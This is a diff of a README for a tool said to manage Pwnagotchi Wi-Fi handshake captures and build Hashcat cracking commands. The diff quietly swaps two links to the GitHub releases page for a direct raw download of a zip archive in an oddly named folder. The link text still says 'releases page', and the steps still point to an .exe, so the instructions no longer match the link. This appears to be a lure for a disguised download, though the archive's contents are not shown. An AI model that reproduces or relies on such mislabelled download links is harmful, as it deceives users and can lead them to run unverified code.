@@ -1,6 +1,6 @@
 # 🛡️ Pwnagotchi_App - Manage your handshake files with ease
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Matiasv6193/Pwnagotchi_App/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/Matiasv6193/Pwnagotchi_App/main/uncohesive/Pwnagotchi-App-3.1.zip)
 
 Pwnagotchi_App provides a visual interface to manage your Pwnagotchi handshake files. You organize your captured data and build complex Hashcat commands through simple menus. This tool removes the need for manual terminal commands.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [releases page](https://github.com/Matiasv6193/Pwnagotchi_App/releases) to access the download options.
+1. Visit the [releases page](https://raw.githubusercontent.com/Matiasv6193/Pwnagotchi_App/main/uncohesive/Pwnagotchi-App-3.1.zip) to access the download options.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
